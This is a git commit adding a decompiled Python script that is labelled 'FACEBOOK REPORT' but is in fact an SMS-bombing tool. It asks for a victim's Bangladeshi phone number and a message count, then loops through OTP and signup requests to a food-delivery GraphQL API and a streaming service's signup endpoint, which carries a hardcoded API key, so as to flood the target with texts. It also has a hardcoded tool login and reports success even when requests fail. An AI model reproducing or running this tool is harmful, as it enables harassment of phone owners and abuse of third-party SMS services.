219ae93f8141918d5f3b8ba3ee742eaf2791fa91
NHBD009 <74887424+Shiddik295@users.noreply.github.com>
2021-08-09 22:57:33 +0600

    WE ARE NOOB

---
+++ FACEBOOK REPORT.py
@@ -0,0 +1,123 @@
+# uncompyle6 version 3.7.3
+# Python bytecode 2.7
+# Decompiled from: Python 2.7.16 (default, Oct 10 2019, 22:02:15) 
+# [GCC 8.3.0]
+# Embedded file name: <script>
+import os, sys, time
+P = '\x1b[0m'
+H = '\x1b[91m'
+G = '\x1b[92m'
+K = '\x1b[93m'
+
+import os
+import time,sys
+os.system('clear')
+logo= '''\033[1;92m
+
+ ____  _____  ____  ____  ______   ______    
+|_   \|_   _||_   ||   _||_   _ \ |_   _ `.  
+  \033[1;93m|   \ | |    | |__| |    | |_) |  | | `. \ 
+ \033[1;94m | |\ \| |    |  __  |    |  __'.  | |  | | 
+ _\033[1;95m| |_\   |_  _| |  | |_  _| |__) |_| |_.' / 
+\033[1;96m|_____|\____||____||____||_______/|______.'  
+                     
+
+'''
+def logop(z):
+    for word in z + '\n':
+        sys.stdout.write(word)
+        sys.stdout.flush()
+        time.sleep(0.01)
+logop(logo)
+
+
+CorrectUsername = "SHIDDIK"
+CorrectPassword = "NHBD"
+
+loop = 'true'
+while (loop == 'true'):
+    username = raw_input("\n\n\033[1;97m\x1b[1;92m         TOOL USERNAME>: ")
+    if (username == CorrectUsername):
+    	password = raw_input("\033[1;97m \x1b[1;92m        TOOL PASSWORD>:  ")
+        if (password == CorrectPassword):
+            print "Logged in successfully as " + username #Dev:love_hacker
+	    time.sleep(2)
+            loop = 'false'
+        else:
+            print "\033[1;94mWrong Password"
+            os.system('xdg-open https://www.facebook.com/me.nhbd.admin.link.copy.kn.korso.mama')
+    else:
+        print "\033[1;94mWrong Username"
+        os.system('xdg-open https://www.facebook.com/me.nhbd.admin.link.copy.kn.korso.mama')
+
+import requests, os, time, sys, smtplib
+blue = '\x1b[94m'
+lightblue = '\x1b[94m'
+red = '\x1b[91m'
+white = '\x1b[97m'
+green = '\x1b[93m'
+green = '\x1b[1;32m'
+cyan = '\x1b[96m'
+end = '\x1b[0m'
+yellow = '\n\n\x1b[1;93m'
+os.system('clear')
+fuck = red + " \xe2\x9a\xa0\xef\xb8\x8f Warning\n DO NOT USE IT TO THE DETRIMENT OF ANYONE\n \x1b[93mALLAH IS WATCHING OVER YOUR ALL TIME"
+notice = yellow + '                \xe2\x9c\xaa\x1b[99mNHBD NEW SMS BOMBING\n                      SHIDDIK                  '
+
+#print ' \n \x1b[92m                                 ###########                                  \n                          ##                         ##                         \n                     #(                                   ##                    \n                 ##                                           ##                \n              ##              #@@@@@&@@@@@&#@%@@@#               ##             \n            #              (@@@@#@@&#(@#@@,#@%&%@@@@#               #           \n          #               #@@@%&@@@&& @  ###(@@@@#@@@&                #         \n        #                   #@#@@@&(##  .  ##%@@@@#@                    #       \n       #                      @@@@@@##    ##@@@@#@,                      #      \n      #                 #@@@@#  @#&#@@%  @#@###@   @@@@@,                 #     \n     (                  #@@@@#   ,@#@#@@@@&@#@#    @@@@@,                  #    \n    #                   #@@@@@@#   #@#@#(##@#   ,&@@@@@@,                   #   \n   #                    #@@@@@@@@@.  #@#%@@   (@@@@@@@@@,                    (  \n   #                    #@@@@@@@@@@@(  #@   %@@@@@@@@@@@,                    #  \n   ,                    #@@@@%@@@@@@@@#  ,@@@@@@@@&@@@@@,                    #  \n                        (##### ,@@@@@@@@@@@@@@@@#  #####,                    #  \n   *                    /(((((((((@@@@@@@@@@@@(  (((((((,                    #  \n   #                    #@@@@@@@@@@@@@@@@@@@, *@@@@@@@@@*                    #  \n   #                    #@@@@@@@@@@@@@@@@#  (@@@@@@@@@@@*                       \n    #                   (%%%%%%%%%%%%%%#  (%%%%%%%%@@@@@*                   #   \n     #                  *////*                     &@@@@*                  #    \n      #                 #@@@@(                     &@@@@*                 #     \n       #                #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*                #      \n        #               #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*              /#       \n          #             #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*             #         \n            #           #@@@@(                     &@@@@*           #           \n              ##        #@@@@(                     &@@@@*        #              \n                 ##                                           ##                \n                     ##                                   ##                    \n                          ##(                       ###                         \n                                     #######"'
+print ''
+
+def logop(z):
+    for word in z + '\n':
+        sys.stdout.write(word)
+        sys.stdout.flush()
+        time.sleep(0.01)
+
+print('''
+ \x1b[92m
+  ____   ___   ___  __  __   ____  __  __ ____  
+ \x1b[95m| __ ) / _ \ / _ \|  \/  | / ___||  \/  / ___| 
+\x1b[94m |  _ \| | | | | | | |\/| | \___ \| |\/| \___ \ 
+\x1b[93m | |_) | |_| | |_| | |  | |  ___) | |  | |___) |
+ \x1b[91m|____/ \___/ \___/|_|  |_| |____/|_|  |_|____/ 
+                                                
+
+                             
+''')
+print ''
+logop('  \x1b[92m\n   | Author===>: NHBD>SHIDDIK\n   | FACEBOOK===>MN SHIDDIK\n   | GROUP===>NOOB HACKER BD [NHBD]\n   | WE ARE NOOB')
+print ''
+print ''
+logop(fuck)
+print ''
+logop(notice)
+print ''
+print ''
+print ''
+print ''
+target = raw_input(cyan + ' [\xe2\x9c\x93] Enter your Attack Number  : +88')
+amount = int(input(cyan + ' [\xe2\x9c\x93]Choose send sms Amount (Unlimited) : '))
+print ''
+print ''
+for i in range(amount):
+    data = {'query': '\nmutation CreateOtp (\n    $phone: PhoneNumber!\n    $country: String!\n    $uuid: String!\n    $osVersionCode: String\n    $deviceBrand: String\n    $deviceModel: String\n    $requestFrom: String\n) {\n    createOtp(\n        auth: {\n            phone: $phone,\n            countryCode: $country,\n            deviceUuid: $uuid,\n            deviceToken: ""\n        }\n        device: {\n            deviceType: WEB\n            osVersionCode: $osVersionCode\n            deviceBrand: $deviceBrand\n            deviceModel: $deviceModel\n        }\n        requestFrom: $requestFrom\n    ){\n        statusCode\n    }\n}\n', 'variables': {'phone': target, 'country': '880', 'uuid': '64b9bb81-93f3-4757-9e92-9cfbf34d8039', 'osVersionCode': 'Linux armv8l', 'deviceBrand': 'Chrome', 'deviceModel': '89', 'requestFrom': 'U2FsdGVkX18QITR3WakOCR2OK+zoIpqM7DqxiLf915s='}}
+    res = requests.post('https://api-v4-2.hungrynaki.com/graphql', json=data)
+    if res.status_code == 200:
+        logop(green + '        [\xe2\x9c\x93]  [NHBD] SMS Sent Successfully')
+    else:
+        logop(green + '        [\xe2\x9c\x93] Sms Sent Successfully')
+    data = {'requestType': 'send', 
+       'phoneNumber': '+880' + target, 
+       'emailConsent': 'true', 
+       'whatsappConsent': 'true', 
+       'email': 'cicas94417@iconmle.com'}
+    header = {'x-api-key': 'dtGKRIAd7y3mwmuXGk63u3MI3Azl1iYX8w9kaeg3'}
+    url = 'https://prod-api.viewlift.com/identity/signup?site=hoichoitv'
+    res = requests.post(url, json=data, headers=header)
+    if res.status_code == 200:
+        logop(red + '        [\xe2\x9c\x93] [NHBD] SMS Sent Successfully')
+    else:
+        logop(red + '        [\xe2\x9c\x93] [NHBD] SMS Sent Successfully ')
+
+os.system('xdg-open https://www.facebook.com/l0wk3y.ofc/')
+logop(yellow + '        \xe2\x9c\xaa Thanks For Using This Tool \xe2\x9c\xaa ')
